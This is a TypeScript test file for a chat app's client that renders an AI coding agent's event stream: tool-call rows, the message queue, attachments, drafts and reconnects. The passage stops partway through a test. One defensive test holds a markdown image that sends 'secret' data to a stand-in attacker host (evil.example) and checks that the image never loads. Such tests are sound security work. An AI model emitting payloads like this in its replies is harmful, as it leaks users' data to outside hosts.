// The app against a scripted server (test/fixture.ts): what a phone shows as the server's AG-UI
// events arrive, and what it sends back.
import { EventType } from "@ag-ui/core";
import { expect, test } from "bun:test";
import { act, cleanup, fireEvent, renderHook, screen, waitFor, within } from "@testing-library/react";
import { useAttachments } from "./chat/use-attachments";
import type { Uploader } from "./lib/attach";
import { sentKey } from "./lib/draft";
import { box, frames, LOG, lastId, onTouchScreen, sentTexts, start, stubApi, type } from "./test/app";
import { ack, type Entry, parseSent, said, snapshot, state } from "./test/fixture";
import type { Asset } from "@wire";
import { Schema } from "effect";

stubApi();

test("the snapshot shows the log: messages, a collapsed tool call, markdown with a raw-text toggle", async () => {
  start();
  await screen.findByText("what is in the repo?");
  expect(screen.getByText(/^Bash/)).toBeTruthy();
  expect(screen.getByText("Completed")).toBeTruthy();
  fireEvent.click(screen.getByText(/^Bash/));
  const output = await screen.findByText(/notes\.md/);
  expect(output.textContent).toContain("repo");
  await screen.findByText("notes"); // rendered: the asterisks are markup
  expect(screen.queryByText(/\*\*notes\*\*/)).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "Show raw text" }));
  expect(screen.getByText("Two things: **notes** and a repo.")).toBeTruthy();
});

test("a tool call reads as Failed when its echo is flagged, not from its output, which stays as logged", async () => {
  const { play } = start([
    { kind: "user", text: "lint it" },
    { kind: "tool", text: 'Bash {"command":"bun run lint"}' },
    { error: true, kind: "echo", text: "src/x.ts:1:1 lint complaint" },
    // looks like a failure, but the log doesn't say so: an echo from before the flag
    { kind: "tool", text: 'Bash {"command":"grep -h Error: log.txt"}' },
    { kind: "echo", text: "Error: disk quota exceeded" },
  ]);
  const failed = await screen.findByText("Failed");
  const row = failed.closest('[data-slot="tool"]');
  expect(row?.textContent).toContain("bun run lint"); // the line names the command
  expect(screen.getAllByText("Failed")).toHaveLength(1); // the grep says nothing aloud but "Completed"
  expect(screen.getByText("Completed")).toBeTruthy();
  fireEvent.click(screen.getByText("bun run lint"));
  await waitFor(() => {
    expect(row?.textContent).toContain("src/x.ts:1:1 lint complaint");
  });
  expect(row?.textContent).toContain("Error"); // the output's header
  // a live result carries the flag too
  play(
    { parentMessageId: "5", toolCallId: "t5", toolCallName: "Read", type: EventType.TOOL_CALL_START },
    { delta: '{"file_path":"gone.md"}', toolCallId: "t5", type: EventType.TOOL_CALL_ARGS },
    { toolCallId: "t5", type: EventType.TOOL_CALL_END },
    { content: "File does not exist.", messageId: "6", metadata: { error: true }, role: "tool", toolCallId: "t5", type: EventType.TOOL_CALL_RESULT },
  );
  await waitFor(() => {
    expect(screen.getAllByText("Failed")).toHaveLength(2);
  });
  expect(screen.getAllByText("Failed")[1]?.closest('[data-slot="tool"]')?.textContent).toContain("gone.md");
});

const CODE: Entry[] = [{ kind: "talk", text: "Here:\n\n```ts\nconst x = 1;\n```" }];
const downloads = () => document.querySelectorAll('[data-streamdown="code-block-download-button"]').length;

test("in the iOS app's WebView the header offers its server screen and code blocks have no download; in a browser neither", async () => {
  start(CODE);
  await screen.findByText(/const x = 1/u);
  expect(screen.queryByRole("button", { name: "Change server" })).toBeNull();
  await waitFor(() => {
    expect(downloads()).toBe(1);
  });
  cleanup();
  const asked: string[] = [];
  globalThis.optchatShell = {
    changeServer: () => {
      asked.push("change-server");
    },
  };
  try {
    start(CODE);
    await screen.findByText(/const x = 1/u);
    // a blob: download can't load in the app (its top frame holds only the server's /)
    expect(downloads()).toBe(0);
    expect(document.querySelectorAll('[data-streamdown="code-block-copy-button"]')).toHaveLength(1);
    fireEvent.click(await screen.findByRole("button", { name: "Change server" }));
    expect(asked).toEqual(["change-server"]);
  } finally {
    globalThis.optchatShell = undefined;
  }
});

test("a turn another client started streams in, with its status line", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "sent from the laptop"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ engine: "claude-code:opus", phase: "running" }));
  expect(await screen.findByText("sent from the laptop")).toBeTruthy();
  expect(screen.getByTestId("status").textContent).toContain("running on mini, Claude Opus (Claude Code)");
  play({ name: "thinking", type: EventType.CUSTOM, value: { tokens: 12 } });
  expect(screen.getByTestId("status").textContent).toContain("thinking…");
  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Half a ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
  await screen.findByText(/Half a/);
  expect(screen.getByTestId("status").textContent).not.toContain("thinking");
  play({ delta: "reply.", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT }, { messageId: "5", type: EventType.TEXT_MESSAGE_END });
  await screen.findByText("Half a reply.");
  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, state({ engine: null, phase: "idle" }));
  await waitFor(() => {
    expect(screen.queryByTestId("status")).toBeNull();
  });
});

test("sending: the message goes out with the picked device and waits in the queue until it is logged; stop aborts", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const device = await screen.findByLabelText("Device");
  fireEvent.change(device, { target: { value: "macbook" } });
  const box = screen.getByLabelText("Message");
  fireEvent.change(box, { target: { value: "and now?" } });
  fireEvent.keyDown(box, { key: "Enter" });
  expect(sentTexts(server.sent)).toEqual([{ device: "macbook", text: "and now?" }]);
  const queue = await screen.findByTestId("queue");
  expect(within(queue).getByText("and now?")).toBeTruthy();

  play(state({ phase: "running" }), ack(lastId(server.sent), 4), ...said(4, "user", "and now?"));
  await waitFor(() => {
    expect(screen.queryByTestId("queue")).toBeNull();
  });
  fireEvent.click(screen.getByRole("button", { name: "Stop" }));
  expect(server.sent.at(-1)).toBe('{"type":"abort"}');
});

test("a message the log refused stays in the queue, marked not logged with the error", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const box = screen.getByLabelText("Message");
  fireEvent.change(box, { target: { value: "will it stick?" } });
  fireEvent.keyDown(box, { key: "Enter" });
  play(ack(lastId(server.sent), null, "no space left"));
  const queue = await screen.findByTestId("queue");
  expect(within(queue).getByText("will it stick?")).toBeTruthy();
  expect(within(queue).getByTestId("queue-error").textContent).toBe("not logged: no space left");
});

test("info and errors show as markers in the chat", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play({ name: "info", type: EventType.CUSTOM, value: "cancelled" }, { message: "usage limit: try later", type: EventType.RUN_ERROR });
  const marker = await screen.findByTestId("marker-info");
  expect(marker.textContent).toContain("cancelled");
  expect(screen.getByRole("alert").textContent).toContain("usage limit: try later");
});

test("older entries are prepended from /api/messages", async () => {
  start(LOG, 100);
  await screen.findByText("what is in the repo?");
  fireEvent.click(screen.getByRole("button", { name: "earlier messages" }));
  await screen.findByText("older message 99");
  const texts = screen.getAllByTestId("user-message").map((m) => m.textContent);
  expect(texts).toEqual(["older message 98", "older message 99", "what is in the repo?"]);
});

test("after a reconnect the chat is rebuilt from the new snapshot, without duplicates", async () => {
  const { log, play, server } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "one more"));
  await screen.findByText("one more");
  log([{ kind: "user", text: "one more" }, { kind: "talk", text: "logged while away" }]);
  act(() => {
    server.drop();
  });
  await screen.findByText("logged while away");
  expect(screen.getAllByText("one more")).toHaveLength(1);
  expect(screen.getAllByText("what is in the repo?")).toHaveLength(1);
  expect(screen.getByRole("img", { name: "connection open" })).toBeTruthy();
});

test("an open tool row copies its input and its output as logged, escape sequences and all", async () => {
  const copied: string[] = [];
  const clipboard = Object.getOwnPropertyDescriptor(navigator, "clipboard");
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText: async (text: string) => void copied.push(text) } });
  try {
    start([
      { kind: "user", text: "colours?" },
      { kind: "tool", text: 'Bash {"command":"ls --color"}' },
      { kind: "echo", text: "\u001B[34mnotes.md\u001B[0m" },
    ]);
    fireEvent.click(await screen.findByText(/^Bash/));
    // shown without the escapes
    await screen.findByText("notes.md");
    fireEvent.click(await screen.findByRole("button", { name: "Copy input" }));
    fireEvent.click(screen.getByRole("button", { name: "Copy output" }));
    await waitFor(() => {
      expect(copied).toEqual(['{"command":"ls --color"}', "\u001B[34mnotes.md\u001B[0m"]);
    });
  } finally {
    if (clipboard) Object.defineProperty(navigator, "clipboard", clipboard);
    else Reflect.deleteProperty(navigator, "clipboard");
  }
});

// the text of the tool row that is open
const openTool = () => document.querySelector('[data-slot="tool"][data-state="open"]')?.textContent ?? "";

test("a tool row opened mid-turn stays open as the turn goes on and the run's snapshot lands", async () => {
  const { log, play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "look again"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
  play(
    { parentMessageId: "5", toolCallId: "t5", toolCallName: "Read", type: EventType.TOOL_CALL_START },
    { delta: '{"file_path":"notes.md"}', toolCallId: "t5", type: EventType.TOOL_CALL_ARGS },
    { toolCallId: "t5", type: EventType.TOOL_CALL_END },
  );
  fireEvent.click(await screen.findByText(/^Read/));
  // the line names the file; open, the input shows as logged, not re-serialised
  await waitFor(() => {
    expect(openTool()).toContain('{"file_path":"notes.md"}');
  });
  play({ content: "# notes", messageId: "6", role: "tool", toolCallId: "t5", type: EventType.TOOL_CALL_RESULT }, ...said(7, "assistant", "It has notes."));
  log([
    { kind: "user", text: "look again" },
    { kind: "tool", text: 'Read {"file_path":"notes.md"}' },
    { kind: "echo", text: "# notes" },
    { kind: "talk", text: "It has notes." },
  ]);
  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, snapshot([...LOG, { kind: "user", text: "look again" }, { kind: "tool", text: 'Read {"file_path":"notes.md"}' }, { kind: "echo", text: "# notes" }, { kind: "talk", text: "It has notes." }]), state({ phase: "idle" }));
  await screen.findByText("It has notes.");
  expect(openTool()).toContain('{"file_path":"notes.md"}'); // still open
  expect(screen.getByText("# notes")).toBeTruthy();
  const rows = [...document.querySelectorAll<HTMLElement>("[data-log-index]")].map((e) => e.dataset.logIndex);
  expect(rows).toEqual(["0", "1", "3", "4", "5", "7"]);
});

test("cancelling, then sending: the new message gets its own bubble", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "cancel me"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Streamed ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
  await screen.findByText(/Streamed/);
  play({ messageId: "5", type: EventType.TEXT_MESSAGE_END }, { message: "cancelled", type: EventType.RUN_ERROR }, snapshot([...LOG, { kind: "user", text: "cancel me" }]), state({ phase: "idle" }));
  await waitFor(() => {
    expect(screen.queryByText(/Streamed/)).toBeNull();
  });
  play(...said(5, "user", "AFTER CANCEL"));
  const bubble = await screen.findByText("AFTER CANCEL");
  expect(bubble.closest("[data-testid=user-message]")?.textContent).toBe("AFTER CANCEL");
});

test("on a touch screen Enter is a new line and the send button sends the text as typed", async () => {
  const realMatch = globalThis.matchMedia;
  globalThis.matchMedia = (query: string) => {
    const list = realMatch(query);
    Object.defineProperty(list, "matches", { value: query === "(pointer: coarse)" });
    return list;
  };
  try {
    const { server } = start();
    await screen.findByText("what is in the repo?");
    const box = screen.getByLabelText("Message");
    fireEvent.change(box, { target: { value: "  two\nlines  " } });
    fireEvent.keyDown(box, { key: "Enter" });
    expect(sentTexts(server.sent)).toEqual([]);
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(sentTexts(server.sent)).toEqual([{ device: undefined, text: "  two\nlines  " }]);
    fireEvent.change(box, { target: { value: " \n " } });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(sentTexts(server.sent)).toHaveLength(1); // a blank message isn't sent
  } finally {
    globalThis.matchMedia = realMatch;
  }
});

test("a reply's markdown never loads an image", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "assistant", "look: ![tracker](https://evil.example/p.png?d=secret) and ![d](data:image/png;base64,AAAA)"));
  await screen.findByText(/look:/);
  await new Promise((resolve) => {
    setTimeout(resolve, 50);
  });
  expect(document.querySelectorAll("img")).toHaveLength(0);
  expect(document.body.innerHTML).not.toContain("evil.example/p.png");
});

// ---------------------------------------------------------------------------------------------
// attachments (SPEC "Media")

// an upload that finishes when the test says: each one as asked for, its progress and its end
const fakeUploads = () => {
  const started: { body: Blob; detail: string; progress: (f: number) => void; finish: (sha: string) => void; fail: (why: string) => void }[] = [];
  const uploader: Uploader = (body, progress, detail = "standard") => {
    const { promise, reject, resolve } = Promise.withResolvers<Asset>();
    const fail = (why: string) => {
      reject(new Error(why));
    };
    const finish = (sha: string) => {
      resolve({ bytes: 2048, height: 600, kind: "image", mime: "image/jpeg", sha, width: 800 });
    };
    started.push({ body, detail, fail, finish, progress });
    return {
      abort: () => {
        fail("upload cancelled");
      },
      done: promise,
    };
  };
  return { started, uploader };
};
const SHA = (c: string) => c.repeat(64);
const png = (name: string) => new File([new Uint8Array([0x89, 0x50, 0x4E, 0x47])], name, { type: "image/png" });
const filesOf = (...files: File[]) => {
  const dt = new DataTransfer();
  for (const f of files) dt.items.add(f);
  return dt.files;
};
const Parts = Schema.Array(Schema.Struct({ type: Schema.String, text: Schema.optional(Schema.String), source: Schema.optional(Schema.Struct({ type: Schema.String, value: Schema.String })) }));

// how many times a hidden file input was opened
const opens = (input: HTMLElement) => {
  const count = { n: 0 };
  input.addEventListener("click", () => {
    count.n++;
  });
  return count;
};

test("with a mouse the composer's + opens the one picker it has (photos and videos) itself", async () => {
  start();
  await screen.findByText("what is in the repo?");
  const library = opens(screen.getByLabelText("Attach: files"));
  fireEvent.click(screen.getByRole("button", { name: "Add context" }));
  expect(library.n).toBe(1);
  expect(screen.queryByRole("dialog", { name: "Add context" })).toBeNull();
});

test("on a touch screen + opens the Add context sheet; a choice opens its picker from the tap and closes; Escape closes and focus goes back to +", async () => {
  await onTouchScreen(async () => {
    start();
    await screen.findByText("what is in the repo?");
    const library = opens(screen.getByLabelText("Attach: files"));
    const camera = opens(screen.getByLabelText("Take a photo: files"));
    const plus = screen.getByRole("button", { name: "Add context" });
    fireEvent.click(plus);
    const sheet = await screen.findByRole("dialog", { name: "Add context" });
    fireEvent.click(within(sheet).getByRole("button", { name: /Camera/ }));
    expect([library.n, camera.n]).toEqual([0, 1]);
    fireEvent.animationEnd(sheet); // happy-dom runs no animations: the drawer waits for its slide-out's end
    await waitFor(() => {
      expect(screen.queryByRole("dialog", { name: "Add context" })).toBeNull();
    });
    fireEvent.click(plus);
    const again = await screen.findByRole("dialog", { name: "Add context" });
    expect(within(again).getByRole("button", { name: /Photos & videos/ })).toBeTruthy();
    fireEvent.keyDown(document.activeElement ?? document.body, { key: "Escape" });
    fireEvent.animationEnd(again);
    await waitFor(() => {
      expect(screen.queryByRole("dialog", { name: "Add context" })).toBeNull();
    });
    await waitFor(() => {
      expect(document.activeElement).toBe(plus); // focus back on the +
    });
  });
});

test("Background work: the running turn (engine, device, time, Stop), held messages with take-back, the compactor per level, the devices", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  // nothing going on: the header's control is quiet, and the sheet says nothing runs
  fireEvent.click(screen.getByRole("button", { name: "Background work" }));
  const quiet = await screen.findByRole("dialog", { name: "Background work" });
  expect(within(quiet).getByText(/Nothing is running/)).toBeTruthy();
  // M7's slot is empty in the app: the server tells of no subagents yet
  expect(within(quiet).queryByText("Subagents")).toBeNull();
  expect(within(quiet).queryAllByTestId("work-subagent")).toHaveLength(0);
  expect(within(quiet).getAllByTestId("work-device").map((d) => d.textContent)).toEqual(["miniThis server · connected, Claude Code 2.1.289", "macbookRunner · offline"]);
  fireEvent.keyDown(document.activeElement ?? document.body, { key: "Escape" });
  fireEvent.animationEnd(quiet); // happy-dom runs no animations: the drawer waits for its slide-out's end
  await waitFor(() => {
    expect(screen.queryByRole("dialog", { name: "Background work" })).toBeNull();
  });

  play(
    state({
      compactions: [
        { failed: 0, level: 0, queued: 3, running: 2 },
        { failed: 1, level: 1, queued: 0, running: 0 },
      ],
      engine: "claude-code:opus",
      pending: [{ clientId: null, engine: "claude-code:opus", queued: true, text: "and the cron output too" }],
      phase: "running",
      elapsed: 65_000,
    }),
  );
  // the status line opens it too
  fireEvent.click(within(screen.getByTestId("status")).getByRole("button"));
  const sheet = await screen.findByRole("dialog", { name: "Background work" });
  const turn = within(sheet).getByTestId("work-turn");
  expect(turn.textContent).toMatch(/^OpusTurn · on mini, 1 min 0[5-9] s$/);
  expect(within(sheet).getAllByTestId("work-compaction").map((c) => c.textContent)).toEqual([
    "Summaries of messagesCompactor · 2 running, 3 queued",
    "Summaries, level 1Compactor · 1 failed, tried again at the next message",
  ]);
  expect(within(sheet).getByTestId("work-held").textContent).toBe("and the cron output tooMessage · queued for Opus");
  fireEvent.click(within(turn).getByRole("button", { name: "Stop the turn" }));
  expect(server.sent.at(-1)).toBe('{"type":"abort"}');
});

// a finger lifted from an element
const tap = (el: Element) => fireEvent.pointerUp(el, { pointerType: "touch" });

test("a tap on a reply shows its actions and hides another's; a tap on a link in it, or outside, doesn't keep them", async () => {
  start([
    { kind: "user", text: "two answers" },
    { kind: "talk", text: "First, see [the docs](https://example.com)." },
    { kind: "talk", text: "Second." },
  ]);
  const firstText = await screen.findByText(/First, see/);
  const first = firstText.closest("[data-reply]");
  const second = screen.getByText("Second.").closest("[data-reply]");
  if (!(first instanceof HTMLElement) || !(second instanceof HTMLElement)) throw new Error("no replies");
  fireEvent.pointerUp(screen.getByText(/First, see/), { pointerType: "mouse" });
  expect(first.dataset.actions).toBeUndefined(); // a mouse keeps hover and focus
  tap(screen.getByText(/First, see/));
  expect(first.dataset.actions).toBe("shown");
  tap(screen.getByText("Second."));
  expect([first.dataset.actions, second.dataset.actions]).toEqual([undefined, "shown"]);
  tap(screen.getByText("Second."));
  expect(second.dataset.actions).toBeUndefined(); // a second tap hides them
  expect(first.getAttribute("role")).toBeNull(); // nothing to activate: no click handler on a reply
  // a link (Streamdown draws it as its link-safety button) is not that tap
  const link = screen.getByText("the docs");
  expect(link.closest("a, button")).not.toBeNull();
  tap(link);
  expect(first.dataset.actions).toBeUndefined();
  tap(screen.getByText(/First, see/));
  fireEvent.pointerDown(document.body);
  await waitFor(() => {
    expect(first.dataset.actions).toBeUndefined(); // a tap outside
  });
  // Raw is in the actions of every reply, shown or not: reachable by focus
  expect(within(first).getByRole("button", { name: "Show raw text" })).toBeTruthy();
});

test("attach, paste and drop fill the tray; send waits for the uploads, names each by digest, and the logged message shows its thumbnails", async () => {
  const uploads = fakeUploads();
  const { play, server } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const send = screen.getByRole("button", { name: "Send" });
  expect(send.hasAttribute("disabled")).toBe(true); // nothing to send yet

  // the picker, a paste, a drop
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  fireEvent.paste(screen.getByLabelText("Message"), { clipboardData: { files: filesOf(png("")), types: ["Files"] } });
  fireEvent.drop(screen.getByLabelText("Message"), { dataTransfer: { files: filesOf(png("dropped.png")), types: ["Files"] } });
  await waitFor(() => {
    expect(uploads.started).toHaveLength(3);
  });
  const tray = screen.getByTestId("attachments");
  expect(within(tray).getAllByTestId("attachment").map((a) => a.dataset.state)).toEqual(["uploading", "uploading", "uploading"]);
  expect(within(tray).getByAltText("pasted image")).toBeTruthy();
  act(() => {
    uploads.started[0]?.progress(0.5);
  });
  expect(within(tray).getByLabelText("Uploading board.png")).toBeTruthy();

  // one fails: it says why and holds the message back until it is removed
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
    uploads.started[1]?.finish(SHA("b"));
    uploads.started[2]?.fail("not an image or video this server takes");
  });
  expect(within(tray).getByRole("alert").textContent).toBe("not an image or video this server takes");
  expect(send.hasAttribute("disabled")).toBe(true);
  fireEvent.click(within(tray).getByLabelText("Remove dropped.png"));
  expect(send.hasAttribute("disabled")).toBe(false); // attachments alone are enough
  fireEvent.click(send);

  const frame = parseSent(server.sent.at(-1) ?? "");
  const parts = Schema.decodeUnknownSync(Parts)(frame.messages?.at(-1)?.content);
  expect(parts).toEqual([
    { text: "", type: "text" },
    { source: { type: "url", value: `asset:${SHA("a")}` }, type: "image" },
    { source: { type: "url", value: `asset:${SHA("b")}` }, type: "image" },
  ]);
  expect(screen.queryByTestId("attachments")).toBeNull(); // the tray is empty again
  // the queue shows them, from the uploads, before the server has said a word
  const queuedMedia = within(await screen.findByTestId("queue")).getByTestId("queue-media");
  expect(within(queuedMedia).getAllByRole("img").map((t) => t.getAttribute("src"))).toEqual(["/api/assets/aaaaaaaaaaaa/thumb", "/api/assets/bbbbbbbbbbbb/thumb"]);

  // logged: the markers, as the server writes them; thumbnails from our own /api/assets
  const markers = `[image aaaaaaaaaaaa 800x600 2KB: a whiteboard]\n[image bbbbbbbbbbbb 800x600 2KB: (not described)]`;
  play(ack(lastId(server.sent), 4), ...said(4, "user", markers));
  await waitFor(() => {
    expect(screen.queryByTestId("queue")).toBeNull();
  });
  const row = screen.getAllByTestId("user-message").at(-1);
  const thumbs = within(row ?? document.body).getAllByRole("img");
  expect(thumbs.map((t) => t.getAttribute("src"))).toEqual(["/api/assets/aaaaaaaaaaaa/thumb", "/api/assets/bbbbbbbbbbbb/thumb"]);
  expect(row?.textContent).toContain("[image aaaaaaaaaaaa 800x600 2KB: a whiteboard]");
  // each one a link to the full asset
  const links = within(row ?? document.body).getAllByRole("link");
  expect(links.map((a) => [a.getAttribute("aria-label"), a.getAttribute("href"), a.getAttribute("target")])).toEqual([
    ["Open image aaaaaaaaaaaa", "/api/assets/aaaaaaaaaaaa", "_blank"],
    ["Open image bbbbbbbbbbbb", "/api/assets/bbbbbbbbbbbb", "_blank"],
  ]);
});

test("removing an attachment while text is typed sends nothing: the tile's button is no submit", async () => {
  const uploads = fakeUploads();
  const { server } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  type("a caption I am still writing");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  await act(async () => {
    uploads.started[0]?.finish(SHA("e"));
  });
  const before = server.sent.length;
  fireEvent.click(screen.getByLabelText("Remove board.png"));
  expect(server.sent.length).toBe(before);
  expect(box().value).toBe("a caption I am still writing");
});

test("a fifth attachment is refused in the tray, and a reply's marker-like text never loads a thumbnail", async () => {
  const uploads = fakeUploads();
  const { play } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(...["1", "2", "3", "4", "5"].map((n) => png(`${n}.png`))) });
  fireEvent.change(picker);
  const tray = await screen.findByTestId("attachments");
  expect(within(tray).getAllByTestId("attachment")).toHaveLength(4);
  expect(within(tray).getByRole("alert").textContent).toBe("at most 4 attachments per message");
  play(...said(4, "assistant", "[image aaaaaaaaaaaa 800x600 2KB: a trap]"));
  await screen.findByText(/a trap/);
  expect(document.querySelectorAll('img[src^="/api/assets/"]')).toHaveLength(0);
});

test("a file removed, or a composer closed, while the photo is being downscaled is never uploaded", async () => {
  const uploads = fakeUploads();
  const tray = renderHook(() => useAttachments(uploads.uploader));
  // removed straight after it was added: downscale is still pending
  act(() => {
    tray.result.current.add([png("gone.png")]);
  });
  const key = tray.result.current.items[0]?.key ?? "";
  act(() => {
    tray.result.current.remove(key);
  });
  // a second one is kept, and a third one's composer unmounts before its downscale ends
  act(() => {
    tray.result.current.add([png("kept.png")]);
  });
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  expect(tray.result.current.items.map((a) => a.name)).toEqual(["kept.png"]);
  const closing = renderHook(() => useAttachments(uploads.uploader));
  act(() => {
    closing.result.current.add([png("closing.png")]);
  });
  closing.unmount();
  await new Promise((resolve) => {
    setTimeout(resolve, 30);
  });
  expect(uploads.started).toHaveLength(1);
});

// ---------------------------------------------------------------------------------------------
// the composer (SPEC "Web UI", Chat): drafts, follow-ups, take-back, the model picker, recall

const photo = (sha: string): Asset => ({ bytes: 2048, height: 600, kind: "image", mime: "image/jpeg", sha, width: 800 });

test("the draft, its text and its finished uploads, survives the page; it is cleared once sent", async () => {
  const uploads = fakeUploads();
  start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  type("half a thought");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
  });
  cleanup(); // the tab is evicted

  const again = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  expect(box().value).toBe("half a thought");
  const tray = screen.getByTestId("attachments");
  expect(within(tray).getByRole("img").getAttribute("src")).toBe("/api/assets/aaaaaaaaaaaa/thumb");
  fireEvent.keyDown(box(), { key: "Enter" });
  const parts = Schema.decodeUnknownSync(Parts)(frames(again.server.sent).at(-1)?.messages?.at(-1)?.content);
  expect(parts).toEqual([
    { text: "half a thought", type: "text" },
    { source: { type: "url", value: `asset:${SHA("a")}` }, type: "image" },
  ]);
  expect(localStorage.getItem("optchat:draft")).toBeNull();
  // sent and not acked yet: kept, so a reload finds it in the server's queue or says it may be lost
  expect(localStorage.getItem(sentKey)).toContain("half a thought");
  again.play(ack(lastId(again.server.sent), 4));
  expect(localStorage.getItem(sentKey)).toBeNull();
});

test("with no storage at all (a private window), the composer works and keeps nothing", async () => {
  // site data blocked: even reading `localStorage` throws, as in some browsers' private modes
  const real = Object.getOwnPropertyDescriptor(globalThis, "localStorage");
  let tried = 0;
  Object.defineProperty(globalThis, "localStorage", {
    configurable: true,
    get: () => {
      tried += 1;
      throw new Error("SecurityError");
    },
  });
  try {
    const { server } = start();
    await screen.findByText("what is in the repo?");
    type("still works");
    fireEvent.keyDown(box(), { key: "Enter" });
    expect(sentTexts(server.sent)).toEqual([{ device: undefined, text: "still works" }]);
    // recall still works, from this page's memory
    fireEvent.keyDown(box(), { key: "ArrowUp" });
    expect(box().value).toBe("still works");
    expect(tried).toBeGreaterThan(0);
  } finally {
    if (real) Object.defineProperty(globalThis, "localStorage", real);
  }
});

test("a message sent before a reload that never reached the server is marked, and taken back into the composer from here", async () => {
  localStorage.setItem(sentKey, JSON.stringify({ at: Date.now(), sent: [{ from: 4, id: "lost-1", media: [photo(SHA("c"))], text: "did it go?" }] }));
  start();
  const queue = await screen.findByTestId("queue");
  // neither the log nor the server's queue has it
  await waitFor(() => {
    expect(within(queue).getByTestId("queue-error").textContent).toContain("it may not have reached the server");
  });
  fireEvent.click(within(queue).getByRole("button", { name: "Take back: did it go?" }));
  expect(box().value).toBe("did it go?");
  expect(within(screen.getByTestId("attachments")).getByRole("img").getAttribute("src")).toBe("/api/assets/cccccccccccc/thumb");
  expect(screen.queryByTestId("queue")).toBeNull();
});

test("one sent before a reload that is older than the loaded window is looked for in the log below it: found, it is done; missing, it is offered to send again; another tab's list is not this one's", async () => {
  localStorage.setItem(
    sentKey,
    JSON.stringify({
      at: Date.now(),
      sent: [
        { from: 4, id: "old-1", media: [], text: "long ago" },
        { from: 90, id: "old-2", media: [], text: "older message 99" },
      ],
    }),
  );
  localStorage.setItem("optchat:sent:another-tab", JSON.stringify({ at: Date.now(), sent: [{ from: 100, id: "theirs", media: [], text: "the other tab's" }] }));
  start(LOG, 100); // the window starts at 100: entries 4 and 90 are below it; /api/messages has 98 and 99
  await screen.findByText("what is in the repo?");
  const item = await screen.findByTestId("queue-item");
  await waitFor(() => {
    expect(within(item).getByTestId("queue-error").textContent).toContain("send it again");
  });
  expect(screen.getAllByTestId("queue-item")).toHaveLength(1);
  expect(item.textContent).toContain("long ago");
  expect(localStorage.getItem(sentKey)).not.toContain("older message 99");
  expect(localStorage.getItem("optchat:sent:another-tab")).toContain("the other tab's");
});

test("queue: a held message shows as queued with its attachments; take-back asks the server and puts it back into the composer", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  type("typed meanwhile");
  play(state({ followUp: "queue", pending: [{ clientId: "q1", engine: "claude-code:opus", media: [photo(SHA("d"))], queued: true, text: "for later" }], phase: "running" }));
  const item = await screen.findByTestId("queue-item");
  expect(item.dataset.state).toBe("queued");
  expect(within(item).getByTestId("queue-where").textContent).toBe("queued for the next turn");
  expect(within(item).getByRole("img").getAttribute("src")).toBe("/api/assets/dddddddddddd/thumb");
  fireEvent.click(within(item).getByRole("button", { name: "Take back: for later" }));
  expect(frames(server.sent).at(-1)).toMatchObject({ clientId: "q1", type: "take-back" });
  play(state({ pending: [] }), { name: "taken-back", type: EventType.CUSTOM, value: { clientId: "q1", error: null, media: [photo(SHA("d"))], text: "for later" } });
  await waitFor(() => {
    expect(box().value).toBe("for later\ntyped meanwhile");
  });
  expect(within(screen.getByTestId("attachments")).getByRole("img").getAttribute("src")).toBe("/api/assets/dddddddddddd/thumb");
  expect(document.activeElement).toBe(box());
});

test("too late to take back: the page says so and the message stays the turn's", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(state({ pending: [{ clientId: "q1", engine: "claude-code:opus", queued: true, text: "racing" }], phase: "running" }));
  fireEvent.click(await screen.findByRole("button", { name: "Take back: racing" }));
  play(state({ pending: [{ clientId: "q1", engine: "claude-code:opus", queued: false, text: "racing" }] }), { name: "taken-back", type: EventType.CUSTOM, value: { clientId: "q1", error: "too late: the model has it", media: [], text: null } });
  const marker = await screen.findByTestId("marker-info");
  expect(marker.textContent).toContain("couldn't take it back: too late: the model has it");
